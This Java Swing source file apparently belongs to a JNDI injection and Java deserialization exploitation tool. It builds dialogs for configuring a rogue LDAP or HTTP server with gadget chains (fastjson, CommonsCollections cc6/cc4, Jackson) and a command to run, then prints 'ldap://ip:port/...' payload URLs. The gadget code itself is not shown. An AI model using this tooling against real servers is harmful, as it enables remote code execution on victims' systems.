package utools;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.ParseException;
import start.ButtonPanel;

import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Random;

import static start.ButtonPanel.cmdOptions;
import static utools.Run.exec;
import static utools.Service.ds;

public class checkPanel {

    public static Object[] checkPanel() {
        JPanel jPanel = new JPanel(new GridLayout(4, 2, 5, 5)); // 使用 GridLayout

        JLabel portLabel = new JLabel("Port:");
        JTextField textField = new JTextField(5);
        jPanel.add(portLabel);
        jPanel.add(textField);

        String[] types = {"base64", "file"};
        String[] protocol = {"LDAP", "HTTP"};

        JLabel base64Label = new JLabel("Base64 code/File path:");
        JLabel protocolLabel = new JLabel("Option:");
        JTextField base64TextField = new JTextField();
        jPanel.add(base64Label);
        jPanel.add(base64TextField);
        jPanel.add(protocolLabel);

        JComboBox<String> typeBox = new JComboBox<>(types);
        JComboBox<String> protocolBox = new JComboBox<>(protocol);
        typeBox.setSelectedIndex(0);
        protocolBox.setSelectedIndex(0);
        jPanel.add(new JLabel("Choose protocolType"));
        jPanel.add(typeBox);
        jPanel.add(protocolBox);

        // 为type选项框添加监听器
        typeBox.addActionListener(e -> {
            String selectedOption = (String) typeBox.getSelectedItem();
            if ("base64".equals(selectedOption)) {
                base64Label.setText("Base64 code:");
            } else if ("file".equals(selectedOption)) {
                base64Label.setText("File path:");
                // 显示文件选择对话框
                JFileChooser fileChooser = new JFileChooser();
                int result = fileChooser.showOpenDialog(null);
                if (result == JFileChooser.APPROVE_OPTION) {
                    File selectedFile = fileChooser.getSelectedFile();
                    base64TextField.setText(selectedFile.getAbsolutePath());
                }
            }
        });

        int userInput = JOptionPane.showConfirmDialog(null, jPanel, "LDAP服务配置",
                JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
        String port = null;
        String selectedOption = null;
        String selectedOption2 = null;
        String base64 = null;
        if (userInput == JOptionPane.OK_OPTION) {
            port = textField.getText();
            selectedOption = (String) typeBox.getSelectedItem();
            base64 = base64TextField.getText();
            selectedOption2 = (String) protocolBox.getSelectedItem();
        } else {
            System.out.println("输入错误");
        }
        return new Object[]{port, selectedOption, base64, selectedOption2};
    }
    public static Object[] normal() {
        JPanel jPanel = new JPanel(new GridLayout(3, 2, 5, 5)); // 使用 GridLayout
        JLabel portLabel = new JLabel("Port:");
        JTextField textField = new JTextField(5);
        jPanel.add(portLabel);
        jPanel.add(textField);
        String[] types = {"fastjson83", "cc6","cc4","jackson"};
        JLabel commLabel = new JLabel("Commend:");
        JLabel GadgetLabel = new JLabel("Option:");
        JTextField commTextField = new JTextField();
        jPanel.add(commLabel);
        jPanel.add(commTextField);
        jPanel.add(GadgetLabel);
        JComboBox<String> typeBox = new JComboBox<>(types);
        jPanel.add(typeBox);
        int userInput = JOptionPane.showConfirmDialog(null, jPanel, "LDAP服务配置",
                JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
        String port = null;
        String commend = null;
        String selectedOption = null;
        if (userInput == JOptionPane.OK_OPTION) {
            port = textField.getText();
            commend = commTextField.getText();
            selectedOption = (String) typeBox.getSelectedItem();
        } else {
            System.out.println("输入错误");
        }
        return new Object[]{port, commend, selectedOption};
    }
    public static JTextArea textArea = new JTextArea();

    public static void listenLDAPServer(String port,Thread listeningThread) throws ParseException {
        String[] args = ButtonPanel.globalArgs;
        CommandLine cmd = cmdOptions(args);
        if (!cmd.hasOption("c")){
            guiPanel(port, listeningThread);
        }
        else {
            String sb = randString();
            System.out.println("Listening on 0.0.0.0:" + port);
            System.out.println("\nPayload：ldap://ip:"+port+"/"+sb);
            System.out.println("\n请将ip换成可以访问的内网或公网地址");
        }
    }
    public static void listenHTTPServer(String port,Thread listeningThread) throws UnknownHostException {
        JFrame frame = new JFrame("HTTPListening");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setSize(400, 300);

        JTextArea textArea = new JTextArea();
        String ipAddress = InetAddress.getLocalHost().getHostAddress();
        textArea.append("Listening on "+ipAddress+":" + port);
        textArea.append("\nyour serializeData is saved in ser.class\n");
        textArea.append("Please visit http://"+ipAddress+":"+port+"/ser.class to get your " +
                "serialized " +
                "file");
        JScrollPane scrollPane = new JScrollPane(textArea);
        frame.getContentPane().add(scrollPane,BorderLayout.CENTER);

        //事件监听
        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                super.windowClosing(e);
                //窗口关闭退出线程
                stopHTTPListening(listeningThread);
            }
        });
        frame.setVisible(true);
    }
    public static String randString(){
        int length = 5;
        // 字符数组，包含所有可能出现在生成的字符串中的字符
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        // 创建一个Random对象
        Random random = new Random();
        // 创建一个StringBuilder对象，用于构建生成的字符串
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            // 从字符数组中随机选择一个字符，并将其添加到StringBuilder中
            char randomChar = characters.charAt(random.nextInt(characters.length()));
            sb.append(randomChar);
        }
        String randString = sb.toString();
        return randString;
    }
    public static void stopLDAPListening(Thread listeningThread) {
        //停止LDAP监听
        if (listeningThread != null && ds != null){
        ds.shutDown(true);
        listeningThread.interrupt();
        }
    }
    public static void stopHTTPListening(Thread listeningThread) {
        //停止HTTP监听
        if(listeningThread != null) {
            exec.destroy();
            listeningThread.interrupt();
        }
    }

    private static void guiPanel(String port,Thread listeningThread) {
        JFrame frame = new JFrame("LDAPListening");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setSize(400, 300);
        String sb = randString();
        textArea.append("Listening on 0.0.0.0:" + port);
        textArea.append("\nPayload：ldap://ip:"+port+"/"+sb);
        textArea.append("\n请将ip换成可以访问的内网或公网地址");
        JScrollPane scrollPane = new JScrollPane(textArea);
        frame.getContentPane().add(scrollPane,BorderLayout.CENTER);
        //事件监听
        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                super.windowClosing(e);
                if (textArea != null){
                    textArea.setText("");
                }
                //窗口关闭退出线程
                stopLDAPListening(listeningThread);
            }
        });
        frame.setVisible(true);
    }
}
